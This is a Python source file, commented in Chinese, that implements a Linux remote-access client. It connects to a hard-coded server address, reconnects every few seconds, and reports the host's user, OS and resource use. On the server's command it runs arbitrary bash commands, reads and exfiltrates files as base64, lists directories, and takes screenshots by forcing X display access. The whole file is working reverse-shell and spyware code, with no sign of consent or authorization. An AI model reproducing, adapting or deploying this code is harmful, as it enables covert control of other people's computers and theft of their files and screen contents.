import socket
import subprocess
import json
import os
import base64
import time
import platform
import shutil
import threading
import psutil

SERVER_IP = '192.168.55.102'
SERVER_PORT = 2383


def take_screenshot_linux():
    """
    在Linux上使用scrot命令截取当前屏幕的截图。
    返回截图文件的字节数据，如果失败则返回None。
    """
    filename = "screenshot_temp.png"
    try:
        # 使用scrot命令截图。'-o'表示覆盖已存在的文件。
        # 使用'check=True'，如果scrot命令失败（例如，没有图形环境），会抛出异常。
        env = os.environ.copy()
        
        # 尝试找到 X authority 文件，这对于从非GUI会话截图至关重要
        home_dir = os.path.expanduser('~')
        xauthority_path = os.path.join(home_dir, '.Xauthority')

        env['DISPLAY'] = ':0'
        if os.path.exists(xauthority_path):
            env['XAUTHORITY'] = xauthority_path
        else:
            print(f"[警告] 未在 {xauthority_path} 找到 Xauthority 文件。截图可能会失败。")

        subprocess.run(['scrot', '-o', filename], check=True, capture_output=True, env=env)

        # 读取截图文件的字节
        if os.path.exists(filename):
            with open(filename, 'rb') as f:
                screenshot_bytes = f.read()
            return screenshot_bytes
        else:
            return None

    except FileNotFoundError:
        print("[错误] scrot 命令未找到。请在Ubuntu客户端上运行 'sudo apt install scrot'。")
        return None  # 表示失败
    except subprocess.CalledProcessError as e:
        # 如果在无头服务器（没有显示器）上运行，scrot会失败
        error_message = e.stderr.decode('utf-8', errors='replace')
        print(f"[错误] scrot 执行失败: {error_message}")
        if "Can't open X display" in error_message:
            print("[信息] 看起来客户端没有图形用户界面 (GUI)，无法截图。")
        return None
    finally:
        # 清理临时文件
        if os.path.exists(filename):
            os.remove(filename)


def reliable_send(sock, data_dict):
    """将字典可靠地编码为JSON并附加换行符后发送"""
    try:
        # 在JSON数据末尾附加换行符作为消息分隔符
        json_data = json.dumps(data_dict).encode('utf-8') + b'\n'
        sock.sendall(json_data)
    except socket.error as e:
        print(f"[错误] 发送数据时发生Socket错误: {e}")
        raise


def send_status_updates(sock, stop_event):
    """在一个后台线程中运行，定期发送状态更新。"""
    while not stop_event.is_set():
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            mem_info = psutil.virtual_memory()
            mem_percent = mem_info.percent
            
            status_data = {
                "type": "status_update",
                "cpu_percent": cpu_percent,
                "mem_percent": mem_percent
            }
            reliable_send(sock, status_data)
            
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            # 如果进程消失或权限不足，则停止
            break
        except Exception as e:
            print(f"[错误] 发送状态更新失败: {e}")
            break # 发生任何其他错误时也退出循环

        # 等待5秒或直到停止事件被触发
        stop_event.wait(5)

def main():
    """客户端主函数，循环连接和处理命令"""
    buffer = b''  # 将缓冲区移到循环外部，以处理跨 recv 调用的消息
    while True:
        client_socket = None
        try:
            print("[调试] 尝试连接服务器...")
            client_socket = socket.socket()
            client_socket.connect((SERVER_IP, SERVER_PORT))
            print(f"[+] 已连接到服务器 {SERVER_IP}:{SERVER_PORT}")
            current_dir = os.getcwd()

            # 为状态更新线程创建一个停止事件
            stop_status_thread = threading.Event()
            status_thread = threading.Thread(
                target=send_status_updates,
                args=(client_socket, stop_status_thread),
                daemon=True
            )
            status_thread.start()

            # 发送初始心跳或客户端信息
            try:
                # 获取操作系统信息
                # 使用 os.environ.get('USER') 在Linux上更可靠
                username = os.environ.get('USER', os.getlogin())
                os_name = platform.system()
                os_version = platform.release() 

                # 构建操作系统字符串
                os_string = f"{os_name} {os_version}"
                reliable_send(client_socket, {"status": "connected", "cwd": current_dir, "user": username, "os": os_string})
            except Exception as e:
                print(f"[错误] 发送初始连接信息失败: {e}")
                break  # 连接可能已断开，尝试重连

            while True:
                try:
                    # 从socket接收数据并追加到缓冲区
                    part = client_socket.recv(4096)
                    if not part:
                        print("[调试] 服务器关闭了连接。")
                        break  # 中断内部循环以重新连接
                    buffer += part
                except socket.error as e:
                    print(f"[错误] 接收数据时发生Socket错误: {e}")
                    break

                # 检查缓冲区中是否包含一个或多个完整的消息（以\n分隔）
                while b'\n' in buffer:
                    message, buffer = buffer.split(b'\n', 1)
                    try:
                        cmd_data = json.loads(message.decode('utf-8'))
                        print(f"[调试] 收到并解析命令: {cmd_data}")
                    except (json.JSONDecodeError, UnicodeDecodeError) as e:
                        print(f"[错误] 解析收到的消息失败: {e} - 消息内容: {message[:100]!r}")
                        continue  # 跳过这条损坏的消息，处理下一条

                    action = cmd_data.get("action")
                    arg = cmd_data.get("arg", "")

                    if not action:
                        try:
                            reliable_send(client_socket, {"output": "错误: 命令缺少 'action' 字段"})
                        except:
                            pass
                        continue

                    try:
                        if action == "exit":
                            break

                        elif action == "cd":
                            output = ""
                            if not arg:
                                output = "错误: 'cd' 命令需要一个目录参数。"
                            else:
                                try:
                                    os.chdir(os.path.expanduser(arg))  # expanduser支持~等路径
                                    current_dir = os.getcwd()
                                    output = f"已切换目录到: {current_dir}"
                                except Exception as e_cd:
                                    output = f"切换目录错误: {e_cd}"
                            reliable_send(client_socket, {"output": output})

                        elif action == "download":
                            expanded_arg = os.path.expanduser(arg)
                            if not arg:
                                reliable_send(client_socket, {"output": "错误: 'download' 命令需要文件路径。"})
                            elif os.path.exists(expanded_arg) and os.path.isfile(expanded_arg):
                                with open(expanded_arg, 'rb') as f:
                                    encoded_content = base64.b64encode(f.read()).decode('utf-8')
                                reliable_send(client_socket,
                                              {"file": os.path.basename(expanded_arg), "data": encoded_content,
                                               "source_path": expanded_arg})
                            else:
                                reliable_send(client_socket, {"output": f"错误: 文件 '{expanded_arg}' 不存在。"})

                        elif action == "screenshot":
                            print("[调试] 开始截图...")
                            screenshot_data = take_screenshot_linux()
                            if screenshot_data:
                                encoded_img = base64.b64encode(screenshot_data).decode('utf-8')
                                reliable_send(client_socket, {"file": "screenshot.png", "data": encoded_img})
                                print("[调试] 截图完成并发送。")
                            else:
                                reliable_send(client_socket, {
                                    "output": "错误: 在客户端执行截图失败。\n可能原因：\n1. 未安装 'scrot' (请运行 sudo apt install scrot)。\n2. 客户端在无图形界面的环境中运行。"})

                        elif action == "read_file":
                            if not arg:
                                reliable_send(client_socket, {"output": "错误: read_file 需要路径参数。"})
                            elif not os.path.exists(arg) or not os.path.isfile(arg):
                                reliable_send(client_socket, {"output": f"错误: 文件 '{arg}' 不存在或不是文件。"})
                            else:
                                try:
                                    with open(arg, 'rb') as f:
                                        content = f.read()
                                    try:
                                        text = content.decode('utf-8')
                                        is_base64 = False
                                    except UnicodeDecodeError:
                                        text = base64.b64encode(content).decode('utf-8')
                                        is_base64 = True
                                    reliable_send(client_socket, {"file_text": text, "path": arg, "is_base64": is_base64})
                                except Exception as e_read:
                                    reliable_send(client_socket, {"output": f"读取文件失败: {e_read}"})

                        elif action == "list_dir":
                            target_path = os.path.expanduser(arg) if arg else current_dir
                            try:
                                entries = []
                                with os.scandir(target_path) as it:
                                    for e in it:
                                        try:
                                            st = e.stat()
                                            entries.append({
                                                "name": e.name,
                                                "is_dir": e.is_dir(),
                                                "size": st.st_size,
                                                "mtime": int(st.st_mtime)
                                            })
                                        except Exception:
                                            entries.append({"name": e.name, "is_dir": e.is_dir(), "size": 0, "mtime": 0})
                                reliable_send(client_socket, {"dir_list": {"cwd": os.path.abspath(target_path), "entries": entries}})
                            except Exception as e_ls:
                                reliable_send(client_socket, {"output": f"列目录失败: {e_ls}"})

                        else:  # 默认执行其他shell命令
                            full_command = f"{action} {arg}".strip()
                            try:
                                # 在Linux上使用 /bin/bash -c
                                result = subprocess.run(
                                    ['/bin/bash', '-c', full_command],
                                    capture_output=True,
                                    text=False,  # 获取原始字节
                                    cwd=current_dir,
                                    timeout=30,
                                    check=False
                                )
                                # Linux默认使用UTF-8编码
                                output = (result.stdout + result.stderr).decode('utf-8', errors='replace')
                                if not output.strip() and result.returncode != 0:
                                    output = f"命令 '{full_command}' 执行完毕，退出码: {result.returncode}，但无输出。"
                                reliable_send(client_socket, {"output": output})
                            except Exception as e_cmd:
                                reliable_send(client_socket, {"output": f"执行命令时发生错误: {e_cmd}"})

                    except socket.error as e:
                        print(f"[错误] 发送响应时Socket错误，中断连接: {e}");
                        break
                    except Exception as e_proc:
                        print(f"[错误] 处理命令时发生错误: {e_proc}")
                        try:
                            reliable_send(client_socket, {"output": f"处理命令时发生错误: {e_proc}"})
                        except:
                            break

                if action == "exit": break  # 如果内部循环因exit退出，外部也应退出

        except socket.error as e_sock:
            print(f"[错误] 客户端 Socket 异常: {e_sock}")
        except Exception as e_main:
            print(f"[错误] 客户端主循环异常: {e_main}")
        finally:
            # 停止状态更新线程
            if 'stop_status_thread' in locals():
                stop_status_thread.set()
                status_thread.join(timeout=2) # 等待线程结束

            if client_socket:
                client_socket.close()
                print("[调试] 客户端套接字已关闭。")

        buffer = b''  # 重连前清空缓冲区
        print("[调试] 5秒后尝试重新连接...")
        time.sleep(5)


if __name__ == '__main__':
    main()
